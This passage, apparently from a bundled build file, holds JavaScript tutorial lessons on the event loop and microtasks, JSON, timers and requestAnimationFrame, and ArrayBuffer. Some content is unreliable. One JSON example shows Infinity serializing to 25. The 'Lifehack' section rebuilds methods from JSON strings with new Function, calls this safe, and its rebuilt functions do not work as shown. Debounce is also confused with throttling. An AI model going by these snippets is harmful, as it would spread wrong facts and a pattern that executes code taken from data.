![ico-25 icon] Microtask\n\n☼☼☼ Microtasks are cheeky guys ignoring queue ☼☼☼\n\nTimer callbacks and UI event handlers are **tasks**.\n\nBut we also have “magic boxes with two holes” - **promises**!\nThe method **~then~** of the **promise** is a higher-order function that takes two callbacks as the arguments.\nAnd here in the Event Loop the following miracles happen:\n\n◘◘![ico-20 cap] ** 5**◘◘\n~~~js\nconst start = Date.now()\n\nfunction message (text) {\n  document.body.innerHTML += `<p>${Date.now() - start}: ${text}</p>`\n}\n\nconst promise = text => new Promise(resolve => resolve(text))\n\nmessage('Start')\n\nsetTimeout(message.bind(null, 'First macrotask'))\nsetTimeout(message.bind(null, 'Second macrotask'))\nsetTimeout(message.bind(null, 'Third macrotask'))\n\npromise('First microtask').then(message)\npromise('Second microtask').then(message)\npromise('Third microtask').then(message)\n~~~\n\n{{{event-loop-microtask.js}}}\n\nTimer callbacks get into the **task queue** earlier than promise callbacks (timers do not have a time set, i.e., by default it is 0).\nSo why do promise callbacks get into the **Call Stack** earlier than timer callbacks?\n\nBecause promise callbacks are **microtasks**, and they have their own separate queue.\n\nWhen the call stack is freed, the engine first looks through the **microtask queue**.\nIf there are callbacks there they will be sent to the **Call Stack** one by one until the **microtask queue** becomes empty.\nOnly then the engine will move on to the task queue.\n\nWhile the tasks are sitting in the task queue and waiting for their turn to get into the Call Stack, nimble micro-tasks slip there under their noses. ![ico-25 smile]\n\n![](illustrations/event-loop-micro-task.gif)\n\n☼☼☼ Microtasks are cheeky little guys who jump into the Call Stack without waiting in line ☼☼☼\n\n________________________________________\n\nAs soon as we run a script for execution, we start a task.\n\nThe following example starts a task that declares the **message** function, sets timers and a ~click~ event handler on the _document.body_ element.\n\nIn addition, this task runs three asynchronous operations using the browser's **Fetch API**.\n\nWe are aware that the **~fetch()~** method returns a **promise**.\n\nThe callback passed to the method  **~then()~** of promise is a **micro-task**.\n\nAnd **micro-tasks** have their own queue, which has a higher priority and is serviced earlier than the **task queue**.\nThus, as soon as the Call Stack is free, all the callbacks that are already in the **microtask queue** at that moment will be executed in turn.\nAnd only then the callbacks from the **task queue** will be executed.\n\n◘◘![ico-20 cap] ** 6**◘◘\n\n~~~js\nconst start = Date.now()\n\nfunction message (text) {\n  document.body.innerHTML += `<p>${Date.now() - start}: ${text}</p>`\n}\n\nconst timer = ms => setTimeout(() => setTimeout(message.bind(null, `timeout ${ms}`), 0), ms)\n\nfunction getUser () {\n  const since = Math.round(Math.random() * 20000)\n  const index = Math.round(Math.random() * 30)\n  return fetch(`https://api.github.com/users?since=${since}`)\n    .then(response => response.json())\n    .then(users => message(`github user ${since + index}: ${users[index].login}`))\n}\n\nmessage('start')\n\ntimer(1000)\ntimer(500)\ntimer(400)\ntimer(200)\n\ngetUser()\ngetUser()\ngetUser()\n~~~\n\n{{{Event-Loop-6.js}}}\n\nIn this example, by sending a **~fetch()~** request to the server, we receive a **promise** and pass the callback to the **~then()~** method of this promise.\nThis callback receives an instance of the **Response** constructor, which needs to be parsed using the **~json()~** method to get the contents of body.\nThe **~json()~** method again returns a **promise**, and we pass the second callback to it's **~then()~** method.\nLast callback will already receive the contents of the server response.\nThus, the first callback will be sent to the **microtask queue** first, and only after it ‘works out’ will the second callback be sent to the **microtask queue**.\n\nIf we were to send only one callback to the **task queue** using the **~setTimeout()~** method, then all timer callbacks would get into the **Call Stack** before the last microtask got into the **microtask queue**.\n\nTo “even the odds,” the timer callback sets the timer again. Then the situation in the **task queue** will be similar to the **microtask queue**.\n\n________________________________________________\n"},49893:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='# ![ico-30 study] JSON\n\nThe storing of JS objects in the form of a text string is convenient from the point of view of exchanging data with the server and storing data of a complex structure.\n\nIt is a more compact alternative to the **XML** format (e<b>X</b>tensible ** M**arkup ** L**anguage).\n\n**~JSON~** - is a built-in native object (![ico-20 warn] not a constructor).\n\nIt has only two methods:\n\n![ico-20 green-ok] **JSON.stringify()**\n![ico-20 green-ok] **JSON.parse()**\n\n~~~~console\n▼ JSON\n    ► parse: ƒ parse()\n    ► stringify: ƒ stringify()\n      Symbol(Symbol.toStringTag): "JSON"\n    ▼ __proto__:\n        ► constructor: ƒ Object()\n        ► hasOwnProperty: ƒ hasOwnProperty()\n        ► isPrototypeOf: ƒ isPrototypeOf()\n        ► propertyIsEnumerable: ƒ propertyIsEnumerable()\n        ► toLocaleString: ƒ toLocaleString()\n        ► toString: ƒ toString()\n        ► valueOf: ƒ valueOf()\n        ► __defineGetter__: ƒ __defineGetter__()\n        ► __defineSetter__: ƒ __defineSetter__()\n        ► __lookupGetter__: ƒ __lookupGetter__()\n        ► __lookupSetter__: ƒ __lookupSetter__()\n        ► get __proto__: ƒ __proto__()\n        ► set __proto__: ƒ __proto__()\n~~~~\n\n_____________________\n\n## ![ico-25 icon] JSON.stringify()\n\nThe only required argument of the method is a reference to an object or array, and the depth of the data structure is not limited.\n^^Two additional formal parameters are optional.^^\nReturn value is JSON string.\n\n◘◘![ico-25 cap] ** 1**◘◘\n~~~js\nvar obj = {\n  name: \'sample\',\n  type: \'figure\',\n  color: \'green\',\n  size: 200,\n  position: [250, 250]\n}\n\nJSON.stringify(obj)\n~~~\n\n~~~console\n\'{"name":"sample","type":"figure","color":"green","size":200,"position":[250,250]}\'\n~~~\n\n__________________________________\n\nThe second (optional) formal parameter can be used, for example, as follows:\n\n◘◘![ico-25 cap] ** 2**◘◘\n~~~js\nvar obj = {\n  name: \'sample\',\n  type: \'figure\',\n  color: \'green\',\n  size: 200,\n  position: [250, 250]\n}\n\nJSON.stringify(obj, [\'name\', \'type\', \'color\'])\n~~~\n\n~~~console\n\'{"name":"sample","type":"figure","color":"green"}\'\n~~~\n\n_________________________________\n\nThe third (optional) formal parameter is needed to format the result:\n\n◘◘![ico-25 cap] ** 3**◘◘\n~~~js\nvar obj = {\n  name: \'sample\',\n  type: \'figure\',\n  color: \'green\',\n  size: 200,\n  position: [250, 250]\n}\n\nconsole.log(JSON.stringify(obj, null, 2))\n~~~\n\n~~~console\n{\n  "name": "sample",\n  "type": "figure",\n  "color": "green",\n  "size": 200,\n  "position": [\n    250,\n    250\n  ]\n}\n~~~\n\n### ![ico-20 icon] Restrictions\n\nThe thing is, object serialization is not always possible.\nThere are so-called **non-serializable** objects that contain **cyclic references**.\n\nFor example, when we try to serialize the **window** object, we will receive a _TypeError_:\n\n◘◘![ico-25 cap] ** 4**◘◘\n~~~js\nconsole.log(JSON.stringify(window, null, 2))\n~~~\n\n••![ico-20 error] Uncaught TypeError: Converting circular structure to JSON••\n\nLet\'s try to serialize an object containing the following properties:\n\n◘◘![ico-25 cap] ** 5**◘◘\n\n~~~js\nvar user = {\n  name: \'Jack\',\n  age: Infinity,\n  hobby: \'football\',\n  [Symbol.for(\'user-pay\')]: 45,\n  job: undefined,\n  getName () {\n    console.log(this.name)\n  }\n}\n\nconsole.log(JSON.stringify(user, null, 2))\n~~~\n\n~~~console\n{\n  "name": "Jack",\n  "age": 25,\n  "hobby": "football"\n}\n~~~\n\nAs can be seen from the example, **Infinity**, **undefined** and **Symbol**, as well as object methods, are discarded during serialization.\n\n_____________________\n\n## ![ico-25 icon] JSON.parse()\n\nThe only required argument of the method is a JSON string.\nThe return value is a JS data structure (array or object).\n\n![ico-20 warn] In a JSON string, all string values ​​(including property names) are enclosed in **double quotes**.\n![ico-20 warn] Numeric and logical values, arrays and objects are not quoted.\n\n![ico-25 cap] ** 6**\n\n~~~js\nvar x = `{\n  "name": "sample",\n  "type": "figure",\n  "attrs": {\n    "color": "green",\n    "size": 200,\n    "position": [250, 250]\n  }\n}`\n\nJSON.parse(x)\n~~~\n\n~~~console\n▼ {name: "sample", type: "figure", attrs: {…}}\n  ▼ attrs:\n        color: "green"\n      ► position: (2) [250, 250]\n        size: 200\n      ► __proto__: Object\n    name: "sample"\n    type: "figure"\n  ► __proto__: Object\n~~~\n\n___________________\n\n## ![ico-25 icon] Deep copy\n\nIt is known that arrays and objects are passed by reference.\n\nIf an object has a flat structure, then you can get an exact copy of this object using the **~Object.assign()~** method.\n\nHowever, if the object\'s properties are objects or arrays, then **~Object.assign()~** will copy references to those nested objects.\n\nIf we first execute **~JSON.stringify()~**, and then **~JSON.parse()~**, the result will be the clone of the object, not a reference.\n\n![ico-25 cap] ** 7**\n\n~~~js\nvar obj = {\n  name: \'sample\',\n  type: \'figure\',\n  color: \'green\',\n  size: 200,\n  position: [250, 250]\n}\nvar sample = JSON.parse(JSON.stringify(obj))\n~~~\n\nThe **sample** variable now contains the clone of the **obj** object, including the values ​​of the elements of array **position**, rather than a reference to it.\n\nLet\'s compare the results of **~Object.assign()~** and **~JSON.stringify()~** → **~JSON.parse ()~**.\n\n~~~js\nvar test = Object.assign({}, obj)\n~~~\n\nBoolean expression:\n\n~~~js\ntest.position === obj.position\n~~~\n\nreturns ~true~ because the value of the **test.position** property is a reference, and the value of the **obj.position** property is also a reference, and these references point to the same object.\n\nAnd here is the logical expression:\n\n~~~js\nsample.position === obj.position\n~~~\n\nwill return ~false~ because **sample.position** is a different object whose reference is not the same as the **obj.position** object reference.\n\n------------------------------------\n\n## ![ico-25 icon] Lifehack\n\nLet\'s set the task of serializing an object, including its methods.\n\n![ico-25 cap] ** 8**\n\nTo do this, first of all, add the **~toJSON~** method to the prototype of constructor **Function**:\n\n~~~js\nFunction.prototype.toJSON = function () {\n  return this.toString()\n}\n~~~\n\nNow the object will be serialized normally, but the method will be included in the json string as a text string:\n\n~~~js\nvar user = {\n  name: \'Jack\',\n  age: 25,\n  hobby: \'football\',\n  getName () {\n    console.log(this.name)\n  }\n}\n\nconsole.log(JSON.stringify(user, null, 2))\n~~~\n\n~~~console\n{\n  "name": "Jack",\n  "age": 25,\n  "hobby": "football",\n  "getName": "getName () {\\n    console.log(this.name)\\n  }"\n}\n~~~\n\nLet\'s write the method declaration a little differently:\n\n~~~js\nvar user = {\n  name: \'Jack\',\n  age: 25,\n  hobby: \'football\',\n  getName: function getName () {\n    console.log(this.name)\n  }\n}\n~~~\n\nand add the method **~parseFuncs~** to the **JSON** object:\n\n~~~js\nJSON.parseFuncs = function (obj) {\n  const result = this.parse(obj)\n  Object.keys(result)\n    .filter(key => typeof result[key] === \'string\' && !result[key].indexOf(\'function\'))\n    .forEach(key => Object.assign(result, { [key]: new Function(result[key]) }))\n\n  return result\n}\n~~~\n\nNow we can safely serialize the object **user** and then parse the result using the **~parseFuncs~** method:\n\n~~~js\nconst piter = JSON.parseFuncs(JSON.stringify(user))\n\nconsole.log(piter)\n~~~\n\n~~~console\n{name: \'Jack\', age: 25, hobby: \'football\', getName: ƒ}\n~~~\n'},6081:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-35 study] Таймеры\n\nThe first argument passed to the timer is always the callback function.\nSetting a timer returns a numeric timer ID.\n\n## ![ico-30 clock] setTimeout\n\nThe ~setTimeout~ method of the ~window~ object takes two arguments:\n\n![ico-20 green-ok] callback function.\n![ico-20 green-ok] duration of the delay interval (in milliseconds).\n\nThe function passed as the first argument will be called at the interval specified by the second argument.\n\n◘◘![ico-25 cap] ** 1**◘◘\n\n~~~js\n(function () {\n  console.log('START')\n\n  setTimeout(() => console.log('One second has passed'), 1000)\n\n  console.log('END')\n})()\n~~~\n\nFirst, the messages 'START' and 'END' will be printed to the console,\n\nand then, after about a second, the message 'One second has passed'.\n\nHowever, this does not mean that if you pass a null value to the ~setTimeout~ method, the callback function will be called immediately.\n\n◘◘![ico-25 cap] ** 2**◘◘\n\n~~~js\n(function () {\n  console.log('START')\n\n  setTimeout(() => console.log('1'))\n\n  console.log('2')\n\n  setTimeout(() => console.log('3'), 0 )\n\n  console.log('END')\n})()\n~~~\n\n~~~console\nSTART\n2\nEND\nundefined // the main thread has finished its work, the call stack is empty.\n1\n3\n~~~\n\n____________________________\n\n## ![ico-25 clock] setInterval\n\nI don't recommend you use this timer.\nFirstly, because the exact time interval cannot be maintained.\n\n^^^[![ico-25 coffee] 3]\n\n~~~js\nfunction showTime () {\n  const demo = document.body\n    .appendChild(document.createElement('h3'))\n  Object.assign(demo, {\n    start: Date.now(),\n    timer: setInterval(() => {\n      demo.innerText = 'Timer for 1000ms: ' + (Date.now() - demo.start)\n      demo.start = Date.now()\n    }, 1000)\n  })\n\n  document.body.onclick = function () {\n    clearInterval(demo.timer)\n    clearInterval(interval)\n  }\n\n  document.body.onmouseover = function () {\n    for (let i = 0; i < 100000; i++) continue\n  }\n}\n\nshowTime()\n\nvar interval = setInterval(() => {\n  for (let i = 0; i < 10000; i++) {\n    document.body.dispatchEvent(new Event('mouseover'))\n  }\n}, 5)\n~~~\n\n^^^\n\n![ico-25 warn] Be sure to stop the timers, otherwise the page will freeze.\nThis, by the way, is the second reason why you should not use the **~setInterval~** timer.\n\n{{{Timers-3.js}}}\n\n_________________________________________\n\nAnd the third reason why you should not use the **~setInterval~** timer is that the frequency at which the browser redraws the page will never coincide with the frequency at which your timer callback is called.\n\nThat is, the timer's callback may trigger several times, but it will only appear on the page when the browser repaints the page again.\n\nSee how the counter value, which is incremented by the timer set to 1ms, is updated on the page:\n\n◘◘![ico-25 cap] ** 4**◘◘\n\n~~~js\nlet counter = 0\n\nconst interval = setInterval(() => counter++, 1)\n~~~\n\n{{{Timers-4.js}}}\n\n___________________________________________\n\nNow let's see how (you shouldn't do this) to animate an object on a page using the **~setInterval~** timer.\nSince I recommend that you favour CSS animation wherever possible, this example will demonstrate a similar animation, but using **~@keyframes~**.\n\nFirst, let's take care of styling the animated elements:\n\n~~~~js\nconst style = document.head\n  .appendChild(document.createElement('style'))\n\nstyle.textContent = `\n  .animated {\n    position: absolute;\n    width: 136px;\n    height: 48px;\n    padding: 8px;\n  }\n\n  .set-interval {\n    background-color: #f50;\n    top: 16px;\n    left: 16px;\n  }\n\n  .set-interval:before {\n    content: 'setInterval';\n  }\n\n  .css-animation {\n    background-color: #09b;\n    top: 80px;\n    animation: move-to-right 12s forwards linear;\n  }\n\n  .css-animation:before {\n    content: 'CSS animation';\n  }\n\n  .set-interval:before,\n  .css-animation:before {\n    font-family: Arial;\n    font-size: 12px;\n    color: #fff;\n  }\n\n  @keyframes move-to-right {\n    from { left: 16px; }\n    to { left: 416px; }\n  }\n`\n~~~~\n\nand declare a function that creates the animated element:\n\n~~~js\nconst createFigure = () => document.body\n  .appendChild(document.createElement('div'))\n~~~\n\nNow let's go directly to the animation.\n\n◘◘![ico-25 cap] ** 5**◘◘\n\n~~~js\nconst makeStep = figure => figure.offsetLeft < 416\n  ? Object.assign(figure.style, {\n      left: figure.offsetLeft + 1 + 'px'\n    })\n  : clearInterval(timer)\n\nconst figure1 = createFigure()\nfigure1.classList.add('animated', 'set-interval')\n\nconst figure2 = createFigure()\nfigure2.classList.add('animated', 'css-animation')\n\nconst timer = setInterval(() => makeStep(figure1), 30)\ndocument.body.onclick = () => clearInterval(timer)\n~~~\n\n{{{Timers-5.js}}}\n\nRemember, it is the browser that turns what you create for the user into pixels, and it does its job much more efficiently than your code.\nCSS animations are always coordinated with the page refresh rate.\nConclusion: you should not try to compete with the browser in what it is obviously stronger than you.\n\nHowever, if you need to use a script to animate something, the browser provides you with a more reliable tool than timers.\n\nThis **~requestAnimationFrame~** is a method of the **window** object.\n\n____________________________________________\n\n## ![ico-25 icon] requestAnimationFrame\n\nSo, there are a few ‘shortcomings’ of timers that make it undesirable to use them for animation.\nThe first is that you can never be sure that the time that passes until the timer's callback function enters the Call Stack will be the time you set when you set the timer.\nThe second is that it is completely unrealistic to match the frequency at which the browser redraws the page with the frequency at which the timer's callback is called.\n\nAs an argument, **~requestAnimationFrame~** gets a callback function that will be called before the next time the browser redraws the page.\n\n◘◘![ico-25 cap] ** 6**◘◘\n\n~~~js\nlet stop = false\n\nconst showTime = function () {\n  document.body.innerHTML = `<h3>${Date.now()}</h3>`\n  !stop && requestAnimationFrame(showTime)\n}\n\ndocument.body.onclick = () => { stop = true }\n\nshowTime()\n~~~\n\n{{{Timers-6.js}}}\n\n**~requestAnimationFrame~** returns an integer that is a unique identifier (reference) for the callback function.\n\n~~~js\nconst showTime = function () {\n  document.body.innerHTML = `<h3>${Date.now()}</h3>`\n}\n\nconsole.log(requestAnimationFrame(showTime))\n~~~\n\nBrowsers redraw the page at a frequency of ~ 60fps (frames per second).\nThis is the frequency at which the callback function will be called, thus avoiding _debouncing_.\n\nThe following example clearly demonstrates that using **~requestAnimationFrame~**.\nprovides a smoother animation than animation using timers,\nbecause the frequency of object coordinate changes is matched to the frequency at which the browser refreshes (redraws) the page.\n\nAs in Example 5, we first style the animated elements:\n\n~~~~js\nconst style = document.head\n  .appendChild(document.createElement('style'))\n\nstyle.textContent = `\n  .animated {\n    position: absolute;\n    width: 136px;\n    height: 48px;\n    padding: 8px;\n  }\n\n  .set-interval {\n    background-color: #f50;\n    top: 16px;\n    left: 16px;\n  }\n\n  .set-interval:before {\n    content: 'setInterval';\n  }\n\n  .request-animation-frame {\n    background-color: #09b;\n    top: 80px;\n  }\n\n  .request-animation-frame:before {\n    content: 'requestAnimationFrame';\n  }\n\n  .set-interval:before,\n  .request-animation-frame:before {\n    font-family: Arial;\n    font-size: 12px;\n    color: #fff;\n  }\n`\n~~~~\n\nNext, we will use the **~createFigure~** function from the same example 5.\nWe will also declare the **~makeStep~** function:\n\n~~~js\nconst makeStep = figure => figure.style.left = figure.offsetLeft + 1 + 'px'\n~~~\n\n◘◘![ico-25 cap] ** 7**◘◘\n\n~~~js\nlet stopAnimation = false\n\nconst figure1 = createFigure()\nfigure1.classList.add('animated', 'set-interval')\nfigure1.makeStep = makeStep.bind(null, figure1)\n\nconst figure2 = createFigure()\nfigure2.classList.add('animated', 'request-animation-frame')\nfigure2.move = function () {\n  makeStep(this)\n  !stopAnimation && requestAnimationFrame(this.move.bind(this))\n}.bind(figure2)\n\n// Let's run the animation:\n\nconst timer = setInterval(() => figure1.makeStep(), 17)\nfigure2.move()\n~~~\n\n{{{Timers-7.js}}}\n\n______________________________________________\n\n◘◘![ico-25 cap] ** 8**◘◘\n\n~~~js\nconst message = 'Old ECMAScript versions was named by numbers: ES5 and ES6.'\n\nconst demo = document.body\n  .appendChild(document.createElement('h3'))\n\nfunction recurse (message) {\n  const array = message.split('')\n  const char = array.shift()\n\n  if (char) {\n    demo.textContent += char\n    requestAnimationFrame(recurse.bind(null, array.join('')))\n  }\n}\n\nrequestAnimationFrame(recurse.bind(null, message))\n~~~\n\n{{{requestAnimationFrame-5.js}}}\n\n__________________________________________\n\nIn the following example, we will output to the page the next array of messages:\n\n~~~js\nconst messages = [\n  'Old ECMAScript versions was named by numbers: ES5 and ES6.',\n  'From 2016, versions are named by year: ES2016, 2018, 2020 ...',\n  'ECMAScript® 2023 Internationalization API Specification',\n  'The 2nd Edition API was adopted by the General Assembly of June 2015, as a complement to the ECMAScript 6th Edition.'\n]\n~~~\n\nLet's make these messages appear on the page at the same time, but one character at a time:\n\n◘◘![ico-25 cap] ** 9**◘◘\n\n~~~js\nfunction recurse (demo, message) {\n  const array = message.split('')\n  const char = array.shift()\n\n  if (char) {\n    demo.textContent += char\n    requestAnimationFrame(recurse.bind(null, demo, array.join('')))\n  }\n}\n\nmessages\n  .forEach(message => {\n    const demo = document.body\n      .appendChild(document.createElement('h3'))\n    requestAnimationFrame(recurse.bind(null, demo, message))\n  })\n~~~\n\n{{{requestAnimationFrame-6.js}}}\n___________________________________________________\n\n## ![ico-25 icon] Debounce\n\nDebounce is an unpleasant phenomenon which means that some function is called too often.\nThis happens most frequently with UI event handlers.\nIt is especially bad if the function code sends a request to the server.\nIt takes time to process such a request, and an impatient user may repeatedly press the button without waiting for an immediate response.\nAlso debounce can occur due to technical reasons, for example, when a mouse button or a key on the keyboard ‘sticks’.\n\nOur task is to prevent debounce regardless of the reason of its origin, i.e. ‘throttle’ function calls by controlling their frequency.\n\nIn the following example, **~requestAnimationFrame~** is used to limit the frequency of clicks to 1 click per second.\n\nLet's declare an auxiliary function **~addElem~**, which will allow us to visualise how clicks are ‘throttled’: when a click ‘passes’, a coloured rectangle will appear, when a click is ignored, the rectangle will be ‘empty’.\nThe **~addElem~** function adds an element to the page and sets its ~background~ style property to the value passed to the function as an argument.\nThe default value of the **~back~** formal parameter will be ~transparent~.\n\n~~~js\nfunction addElem (back = 'transparent') {\n  const elem = section\n    .appendChild(document.createElement('span'))\n  elem.style = `\n    position: relative;\n    display: inline-block;\n    width: 10px;\n    height: 20px;\n    border: dotted 0.1px white;\n    box-sizing: border-box;\n    background: ${back};\n  `\n}\n~~~\n\nNow we can write the ‘throttle’ code itself:\n\n◘◘![ico-25 cap] **10**◘◘\n~~~js\nconst section = document.body\n\nsection.timeStamps = []\n\nsection.showClick = function () {\n  const interval = section.timeEnd - section.timeStart\n  const back = interval >= 1000 ? '#09b' : 'transparent'\n\n  addElem(back)\n\n  section.timeStart = interval >= 1000 ? section.timeEnd : section.timeStart\n}\n\nsection.onclick = (function () {\n  section.timeStart = section.timeEnd = new Date().getTime()\n\n  return function (event) {\n    section.timeEnd = new Date().getTime()\n    requestAnimationFrame(section.showClick)\n  }\n})()\n~~~\n\n{{{Timers-10.js}}}\n\n_________________________________________________________\n\n## ![ico-25 icon] Examples\n\n^^^[![ico-25 cap] 11]\n\n~~~js\nfunction addElem (tagName, container = document.body) {\n  return container\n    .appendChild(document.createElement(tagName))\n}\n\nfunction createAnimated (title, container) {\n  return Object.assign(addElem('div', container), {\n    title,\n    style: `\n      position: absolute;\n      width: ${container.size}px;\n      height: ${container.size}px;\n      background: ${container.randomColor()};\n      top: ${container.randomY()}px;\n      left: ${container.randomX()}px;\n    `,\n    targetY: null,\n    targetX: null,\n    setTarget () {\n      Object.assign(this, {\n        targetY: container.randomY(),\n        targetX: container.randomX()\n      })\n    },\n    resetTarget () {\n      Object.assign(this, { targetX: null, targetY: null })\n    },\n\n    setDistance () {\n      Object.assign(this, {\n        distanceX: this.targetX - parseInt(this.style.left),\n        distanceY: this.targetY - parseInt(this.style.top)\n      })\n    },\n\n    movieClip () {\n      if (container.stop) return\n\n      if (!this.targetY && !this.targetX) this.setTarget()\n      else {\n        this.setDistance()\n        if (!this.distanceY && !this.distanceX) this.resetTarget()\n        else {\n          Object.assign(this.style, {\n            top: parseInt(this.style.top) + Math.sign(this.distanceY) + 'px',\n            left: parseInt(this.style.left) + Math.sign(this.distanceX) + 'px'\n          })\n        }\n      }\n\n      requestAnimationFrame(this.movieClip.bind(this))\n    }\n  })\n}\n\nconst demo = Object.assign(addElem('section'), {\n  size: 40,\n  stop: true,\n  style: `\n    position: absolute;\n    width: 95%;\n    height: 300px;\n    background-color: #000;\n  `,\n  random: (maxVal, minVal = 0) => Math.max(minVal, Math.round(Math.random() * maxVal)),\n  randomX () {\n    return this.random(this.offsetWidth - this.size)\n  },\n  randomY () {\n    return this.random(this.offsetHeight - this.size)\n  },\n  randomColor () {\n    return `rgb(${this.random(255, 100)}, ${this.random(255, 100)}, ${this.random(255, 100)})`\n  }\n})\n\nObject.assign(demo, {\n  elems: [1, 2, 3, 4].map(num => createAnimated(num, demo)),\n\n  onclick: function (event) {\n    this.stop = !this.stop\n    !this.stop &&\n      this.elems.forEach(elem => requestAnimationFrame(elem.movieClip.bind(elem)))\n  }.bind(demo)\n})\n\ndemo.dispatchEvent(new Event('click'))\n~~~\n^^^\n\n{{{Timers-requestAnimationFrame.js}}}\n\n___________________________________________________\n\n◘◘![ico-25 cap] **12**◘◘\n\n~~~js\nfunction store () {\n  return Array.from(arguments)\n    .reduce((res, item) => res += item)\n}\n\nconst demo = document.body\n  .appendChild(document.createElement('h3'))\n\ndocument.body.onkeypress = function (event) {\n  store = store.bind(null, parseInt(event.key) || 0)\n  demo.innerText = store()\n}\n\nfunction recurse (num) {\n  if (num > 0) {\n    document.body\n      .dispatchEvent(Object.assign(new Event('keypress'), {\n        key: Math.round(Math.random() * 9)\n      }))\n    requestAnimationFrame(recurse.bind(null, --num))\n  }\n}\n\nrecurse(200)\n~~~\n\n{{{Timers-requestAnimationFrame-1.js}}}\n______________________________________________\n\n![ico-25 cap] **13**\n\n{{{Timers-requestAnimationFrame-2.js}}}\n"},76852:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] ArrayBuffer\n\n**Constructor**\n\nCreates an instance with binary data.\n\nThere is no direct access to the data in the ~ArrayBuffer~ instance.\n\nOnly the length of the buffer in bytes is readable.\n\n~~~js\nvar buffer  = new ArrayBuffer(16)\nconsole.log(buffer.byteLength)  // 16\n~~~\n\n_________________________________\n\n## ![ico-25 icon] TypedArray\n\n[**MDN**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/TypedArray/)\n\nTyped arrays have a fixed length and are used to store data in binary format (raw data).\nData in typed arrays can only be accessed through **views**, there is no direct access.\n\nBinary data stored in a typed array can be interpreted as a string, as an audio or video file, as an image, or as an array of numbers.\nThe **TypedArray** constructor is also not directly available, and can be referenced from the inheritance chain of any instance.\n\n~~~js\nconst buffer = new ArrayBuffer(8)\nconst int16Array = new Int16Array(buffer)\nconst typedArrayPrototype = int16Array.__proto__.__proto__\n\nconsole.log(typedArrayPrototype.constructor.name)\n~~~\n\n••'TypedArray'••\n\n~~~js\nconst excluding = ['buffer', 'byteLength', 'byteOffset', 'length']\n\nObject.getOwnPropertyNames(typedArrayPrototype)\n  .filter(name => !excluding.includes(name))\n  .filter(name => typeof typedArrayPrototype[name] === 'function')\n~~~\n\n~~~~console\n▼ (32) ['constructor', 'entries', 'keys', 'values', 'at', 'copyWithin', 'every', 'fill', 'filter', 'find', 'findIndex', 'findLast', 'findLastIndex', 'forEach', 'includes', 'indexOf', 'join', 'lastIndexOf', 'map', 'reverse', 'reduce', 'reduceRight', 'set', 'slice', 'some', 'sort', 'subarray', 'toReversed', 'toSorted', 'with', 'toLocaleString', 'toString']\n    0: \"constructor\"\n    1: \"entries\"\n    2: \"keys\"\n    3: \"values\"\n    4: \"at\"\n    5: \"copyWithin\"\n    6: \"every\"\n    7: \"fill\"\n    8: \"filter\"\n    9: \"find\"\n    10: \"findIndex\"\n    11: \"findLast\"\n    12: \"findLastIndex\"\n    13: \"forEach\"\n    14: \"includes\"\n    15: \"indexOf\"\n    16: \"join\"\n    17: \"lastIndexOf\"\n    18: \"map\"\n    19: \"reverse\"\n    20: \"reduce\"\n    21: \"reduceRight\"\n    22: \"set\"\n    23: \"slice\"\n    24: \"some\"\n    25: \"sort\"\n    26: \"subarray\"\n    27: \"toReversed\"\n    28: \"toSorted\"\n    29: \"with\"\n    30: \"toLocaleString\"\n    31: \"toString\"\n    length: 32\n  ► [[Prototype]]: Array(0)\n~~~~\n\n_____________________________________\n\n## ![ico-25 icon] Accessors\n\nTo work with **~ArrayBuffer~** instance data, you must use constructors that instantiate **accessors**.\n\n![ico-20 green-ok] DataView\n![ico-20 green-ok] Int8Array\n![ico-20 green-ok] Uint8Array\n![ico-20 green-ok] Int16Array\n![ico-20 green-ok] Uint16Array\n![ico-20 green-ok] Int32Array\n![ico-20 green-ok] Uint32Array\n\n~~~js\nvar sample = new ArrayBuffer(32)\nnew Uint8Array(sample)\n// ► Uint8Array(32) [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]\nnew Int16Array(sample)\n// ► Int16Array(16) [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]\nnew Uint16Array(sample)\n// ► Uint16Array(16) [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]\nnew Uint32Array(sample)\n// ► Uint32Array(8) [0, 0, 0, 0, 0, 0, 0, 0]\nnew Int32Array(sample)\n// ► Int32Array(8) [0, 0, 0, 0, 0, 0, 0, 0]\n~~~\n\nCalling the ~Int8Array~, ~Uint8Array~, ~Int16Array~, ~Uint16Array~, ~Int32Array~, ~Uint32Array~ will result in an _iterable object_ with numeric data.\n\nTo get an array, you can use the **~Array.from()~** method:\n\n~~~js\nvar buffer  = new ArrayBuffer(16)\nvar sample = Array.from(new Uint8Array(buffer))\nsample[0] = 50\nsample[3] = 255\nsample[4] = 178\nconsole.log(sample)\n~~~\n\n**Result**\n\n•• ► (16) [50, 0, 0, 255, 178, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]••\n\nHowever, this is a \"one-way road\" because it creates a new array **~sample~** where changes are not reflected in the original object **~buffer~**.\n\n______________________________________________\n\n### ![ico-20 icon] DataView\n\nThis constructor is used to create an accessor instance that provides flexible access to the data in the original **~ArrayBuffer~** instance.\n\n~~~js\nvar buffer = new ArrayBuffer(16)\nvar dataView = new DataView(buffer)\nconsole.log(dataView.__proto__)\n~~~\n\n~~~console\n▼ DataView {constructor: ƒ, getInt8: ƒ, …}\n    buffer: (...)\n    byteLength: (...)\n    byteOffset: (...)\n  ► constructor: ƒ DataView()\n  ► getBigInt64: ƒ getBigInt64()\n  ► getBigUint64: ƒ getBigUint64()\n  ► getFloat32: ƒ getFloat32()\n  ► getFloat64: ƒ getFloat64()\n  ► getInt8: ƒ getInt8()\n  ► getInt16: ƒ getInt16()\n  ► getInt32: ƒ getInt32()\n  ► getUint8: ƒ getUint8()\n  ► getUint16: ƒ getUint16()\n  ► getUint32: ƒ getUint32()\n  ► setBigInt64: ƒ setBigInt64()\n  ► setBigUint64: ƒ setBigUint64()\n  ► setFloat32: ƒ setFloat32()\n  ► setFloat64: ƒ setFloat64()\n  ► setInt8: ƒ setInt8()\n  ► setInt16: ƒ setInt16()\n  ► setInt32: ƒ setInt32()\n  ► setUint8: ƒ 